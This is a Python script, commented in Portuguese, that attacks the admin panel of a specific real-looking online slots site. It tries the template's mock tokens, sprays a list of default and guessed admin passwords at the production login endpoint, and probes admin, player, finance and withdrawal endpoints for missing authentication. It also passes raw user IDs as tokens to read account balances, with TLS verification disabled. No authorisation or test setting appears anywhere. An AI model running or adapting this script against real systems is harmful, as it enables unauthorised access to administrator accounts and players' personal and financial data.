"""Exploração focada do PA com achados do HTML."""
import urllib.request, urllib.error, ssl, json, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

PA   = "https://pa.rainha777slots.com"
BASE = PA + "/prod-api"

def req(method, url, body=None, token=None):
    h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json, */*",
         "Origin": PA, "Referer": PA + "/login"}
    if body is not None: h["Content-Type"] = "application/json"
    if token:
        h["Authorization"] = f"Bearer {token}"
        h["Token"] = str(token)
    data = json.dumps(body).encode() if body else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(8192).decode("utf-8","ignore")
            try: return resp.status, json.loads(raw)
            except: return resp.status, {"_raw": raw[:500]}
    except urllib.error.HTTPError as e:
        raw = e.read(4096).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, json.loads(raw)
        except: return e.code, {"_raw": raw[:300]}
    except Exception as ex:
        return 0, {"err": str(ex)}

print("=" * 60)
print("TESTE 1 — Tokens hardcoded no Vue Admin Template")
print("=" * 60)

# Os tokens mock do template podem estar no backend também
for mock_token in ["admin-token", "editor-token", "any-token"]:
    # Tenta chamar endpoint autenticado com token mock
    st, b = req("GET", BASE + "/system/user/info", token=mock_token)
    code = b.get("code") if isinstance(b,dict) else None
    print(f"  Token={mock_token!r} → HTTP={st} code={code} msg={str(b.get('msg',''))[:50]!r}")
    if code == 200 and b.get("data"):
        print(f"    🔴 ACEITO! data={json.dumps(b['data'], ensure_ascii=False)[:400]}")
    time.sleep(0.5)

print()
print("=" * 60)
print("TESTE 2 — Login real no PA via /prod-api/system/user/gsf/login")
print("=" * 60)

# Credenciais do Vue Admin Template padrão + customizadas
credentials = [
    ("admin",    "admin123"),
    ("admin",    "admin"),
    ("admin",    "111111"),
    ("admin",    "123456"),
    ("admin",    "Admin@123"),
    ("editor",   "editor"),
    ("editor",   "111111"),
    ("agent",    "agent"),
    ("agente",   "agente123"),
    ("test",     "test123"),
    ("rainha",   "rainha777"),
    ("amizade",  "amizade777"),
    ("super",    "super123"),
    ("operator", "operator"),
    ("admin",    ""),
    ("admin",    "admin@2024"),
    ("admin",    "Admin2024"),
    ("admin",    "Ra1nha777"),
]

found_token = None
for user, pwd in credentials:
    for payload in [
        {"username": user, "password": pwd},
        {"account":  user, "password": pwd},
        {"loginName":user, "password": pwd},
    ]:
        st, b = req("POST", BASE + "/system/user/gsf/login", payload)
        code = b.get("code") if isinstance(b,dict) else None
        data = b.get("data") if isinstance(b,dict) else None
        msg  = str(b.get("msg",""))[:60] if isinstance(b,dict) else str(b)[:100]

        if code == 200 and data:
            print(f"\n  🔴 LOGIN BEM-SUCEDIDO!")
            print(f"  user={user!r} pwd={pwd!r} campo={list(payload.keys())[0]!r}")
            print(f"  code={code} data={json.dumps(data, ensure_ascii=False)[:500]}")
            if isinstance(data, dict):
                found_token = (data.get("token") or data.get("access_token") or
                               data.get("tokenHead","").rstrip() + " " + data.get("tokenValue",""))
                print(f"  TOKEN: {found_token}")
            break
        elif code not in (None, 401, 403, 404, 405, 500, 400):
            print(f"  {user}/{pwd} → code={code} msg={msg!r}")
    else:
        continue
    break

if not found_token:
    print("\n  Credenciais comuns não funcionaram.")

print()
print("=" * 60)
print("TESTE 3 — Endpoints admin SEM autenticação")
print("=" * 60)

# O PA usa /prod-api como base.
# Testa os endpoints de convite/admin que o JS mencionou,
# sem token, pra ver se tem BROKEN ACCESS CONTROL
admin_paths = [
    "/invite/admin/invite/getUserInviteList",
    "/invite/admin/invite/getInviteConfig",
    "/invite/admin/invite/getRewardRecordList",
    "/invite/admin/invite/queryInviteDayReportData",
    "/invite/admin/invite/getBindRewardRecord",
    "/invite/admin/invite/queryInviteRewardData",
    "/invite/admin/invite/queryUnsettleInviteRewardData",
    "/invite/admin/invite/queryInviteRewardNoSettle",
    "/system/user/gsf/getUserList",
    "/system/user/gsf/info",
    "/system/user/info",
    "/system/user/list",
    "/player/list",
    "/player/info",
    "/finance/list",
    "/admin/player/list",
    "/admin/finance/list",
    "/admin/withdraw/list",
    "/admin/recharge/list",
]

for path in admin_paths:
    # Sem token
    st, b = req("GET", BASE + path)
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    msg  = str(b.get("msg",""))[:60] if isinstance(b,dict) else ""
    if code == 200 and data:
        print(f"  🔴 SEM AUTH! GET {path}")
        print(f"    data={json.dumps(data, ensure_ascii=False)[:400]}")
    elif code not in (None, 401, 403, 404, 405, 500, 400):
        print(f"  [{st}] GET {path} → code={code} msg={msg!r}")

    # Com token se tiver
    if found_token:
        st2, b2 = req("GET", BASE + path, token=found_token)
        code2 = b2.get("code") if isinstance(b2,dict) else None
        data2 = b2.get("data") if isinstance(b2,dict) else None
        if code2 == 200 and data2:
            print(f"  🟠 COM AUTH! GET {path}")
            print(f"    data={json.dumps(data2, ensure_ascii=False)[:400]}")
    time.sleep(0.3)

print()
print("=" * 60)
print("TESTE 4 — Token anão no backend do PA")
print("=" * 60)

# O PA usa /prod-api apontado para pa.rainha777slots.com.
# Esse backend é diferente do ds.rainha777slots.com?
# Testa token anão no mesmo querySimpleBalance via PA
for uid in [1, 137027]:
    st, b = req("GET", PA + "/prod-api/japi/user/balance/querySimpleBalance", token=uid)
    code = b.get("code") if isinstance(b,dict) else None
    # Tenta via japi direto no pa
    st2, b2 = req("GET", PA + "/japi/user/balance/querySimpleBalance", token=uid)
    code2 = b2.get("code") if isinstance(b2,dict) else None
    print(f"  Token={uid}: /prod-api/japi code={code} | /japi code={code2} data={b2.get('data') if code2==200 else b.get('data')}")
    time.sleep(0.3)

print("\nConcluído.")
